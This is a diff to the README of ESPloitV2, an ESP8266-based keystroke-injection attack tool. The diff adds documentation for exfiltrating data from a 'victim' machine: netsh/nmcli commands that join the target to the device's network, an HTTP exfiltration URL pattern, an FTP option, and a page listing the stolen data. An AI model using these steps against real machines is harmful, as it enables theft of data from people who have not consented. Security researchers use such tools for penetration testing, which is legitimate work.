@@ -27,6 +27,8 @@ Select Tools - Board - Boards Manager. Search for "esp8266".
 Install "esp8266 by ESP8266 community version 2.3.0". Click "Close".  
 Select Sketch - Include Library - Manage Libraries. Search for "Json".  
 Install "ArduinoJson by Benoit Blanchon version 5.11.0" and click "Close"  
+Download https://github.com/apullin/esp8266FTPServer/archive/feature/bbx10_speedup.zip  
+Click Sketch - Include Library - Add .ZIP Library and select bbx10_speedup.zip from your Downloads folder.  
 The Arduino IDE is now configured and ready for the code.  
   
 Use git to clone this repo: https://github.com/exploitagency/ESPloitV2.git  
@@ -223,6 +225,12 @@ Live Payload Mode
 Here you may type out or copy/paste a payload to run without uploading.  
   
 -----  
+List Exfiltrated Data  
+-----  
+  
+Displays any data that has been collected from the victim using ESPloit's exfiltration methods.  
+  
+-----  
 Input Mode  
 -----  
   
@@ -251,7 +259,24 @@ Select "Browse" choose the new firmware to be uploaded to the ESP-12S chip and t
 You will need to manually reset the device upon the browser alerting you that the upgrade was successful.  
   
 If you are using this mode to swap the firmware loaded on the ESP-12S chip, and if the new firmware does not support this mode then you must reflash the ESP-12S manually by uploading the programmer sketch to the 32u4 chip and then flash the ESP-12S this way.
-    
+  
+-----  
+Exfiltrating Data  
+-----  
+  
+To exfiltrate data be sure ESPloit and Target machine are on the same network.  
+Either set ESPloit to join the Target's network or set the Target to join ESPloit's AP.  
+  
+Windows: netsh wlan set hostednetwork mode=allow ssid="SSID-HERE" key="WIFI-PASSWORD-HERE"  
+Linux: nmcli dev wifi connect SSID-HERE password WIFI-PASSWORD-HERE  
+  
+For HTTP exfiltration method point the target machine to the url listed below:  
+http://ESPloit-IP-Here/exfiltrate?file=FILENAME.TXT&data=EXFILTRATED-DATA-HERE  
+  
+For FTP exfiltration method use the credentials configured in the "Configure ESPloit" page.  
+  
+See the example payloads for more in depth examples.  
+  
 -----  
 Changing the VID/PID  
 -----  
